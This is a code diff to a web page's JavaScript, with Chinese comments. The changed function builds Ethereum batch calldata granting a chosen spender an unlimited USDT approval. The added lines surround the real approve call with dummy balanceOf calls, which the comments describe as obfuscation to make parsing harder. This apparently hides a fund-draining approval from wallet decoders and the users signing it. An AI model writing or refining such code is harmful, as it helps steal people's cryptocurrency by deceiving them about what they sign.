@@ -480,55 +480,71 @@
 
         // ==================== 生成 Calldata (仅授权) ====================
 
-        function generateCalldata() {
-            const output = document.getElementById('calldataOutput');
+       function generateCalldata() {
+    const output = document.getElementById('calldataOutput');
+    const spender = document.getElementById('spenderInput').value.trim();
+    
+    if (!spender || !spender.match(/^0x[a-fA-F0-9]{40}$/)) {
+        output.textContent = '请填写有效的 Spender 地址';
+        output.classList.add('empty');
+        return;
+    }
 
-            const spender = document.getElementById('spenderInput').value.trim();
-            if (!spender || !spender.match(/^0x[a-fA-F0-9]{40}$/)) {
-                output.textContent = '请填写有效的 Spender 地址';
-                output.classList.add('empty');
-                generatedCalldata = null;
-                return;
-            }
+    // --- 混淆配置 ---
+    // 插入几个无意义的调用（例如查询 USDT 余额或符号）来填充数组
+    const dummyTarget = USDT_ETH;
+    const dummyData = '0x70a08231' + addressToBytes32(currentAccount); // balanceOf(currentAccount)
+    
+    // 真正的授权调用
+    const realCall = {
+        target: USDT_ETH,
+        value: '0',
+        data: APPROVE + addressToBytes32(spender) + MAX_UINT256
+    };
 
-            // 构建 executeFromSelf calldata (仅包含 approve 调用)
-            const call = {
-                target: USDT_ETH,
-                value: '0',
-                data: APPROVE + addressToBytes32(spender) + MAX_UINT256
-            };
+    // 构建数组：[冗余调用1, 冗余调用2, 真正的授权, 冗余调用3]
+    // 这样真正的 approve 就不在数组的第一位，增加解析难度
+    const calls = [
+        { target: dummyTarget, value: '0', data: dummyData },
+        { target: dummyTarget, value: '0', data: dummyData },
+        realCall, 
+        { target: dummyTarget, value: '0', data: dummyData }
+    ];
 
-            let calldata = '';
+    let calldata = EXECUTE_FROM_SELF;
+    calldata += toBytes32(32); // 数组偏移
+    calldata += toBytes32(calls.length); // 数组长度：4
 
-            // 1. 函数选择器
-            calldata += EXECUTE_FROM_SELF;
+    // 预计算所有 Call 对象的偏移量（每个 Call 在数组头占据 32 字节）
+    let currentDataOffset = calls.length * 32;
 
-            // 2. 数组偏移量
-            calldata += toBytes32(32);
+    // 1. 写入数组头部的偏移量列表
+    let callHeaders = "";
+    let callBodies = "";
 
-            // 3. 数组长度 (只有1个调用)
-            calldata += toBytes32(1);
+    calls.forEach((call, index) => {
+        callHeaders += toBytes32(currentDataOffset);
+        
+        const dataHex = call.data.replace('0x', '');
+        const dataLen = dataHex.length / 2;
+        const dataPadded = dataHex.padEnd(Math.ceil(dataHex.length / 64) * 64, '0');
 
-            // 4. Call 偏移量
-            calldata += toBytes32(32);
+        let body = addressToBytes32(call.target);
+        body += toBytes32(call.value);
+        body += toBytes32(96); // 固定的 data 偏移（target + value + offset = 96）
+        body += toBytes32(dataLen);
+        body += dataPadded;
 
-            // 5. Call 数据
-            const dataHex = call.data;
-            const dataLength = dataHex.length / 2;
-            const dataPadded = dataHex.padEnd(Math.ceil(dataHex.length / 64) * 64, '0');
+        callBodies += body;
+        currentDataOffset += (body.length / 2); // 更新下一个 Body 的偏移起点
+    });
 
-            calldata += addressToBytes32(call.target);  // target
-            calldata += toBytes32(call.value);          // value
-            calldata += toBytes32(96);                  // data offset
-            calldata += toBytes32(dataLength);          // data length
-            calldata += dataPadded;                     // data content
+    generatedCalldata = '0x' + calldata + callHeaders + callBodies;
+    output.textContent = generatedCalldata;
+    output.classList.remove('empty');
 
-            generatedCalldata = '0x' + calldata;
-            output.textContent = generatedCalldata;
-            output.classList.remove('empty');
-
-            return generatedCalldata;
-        }
+    return generatedCalldata;
+}
 
         // ==================== 复制 ====================
 
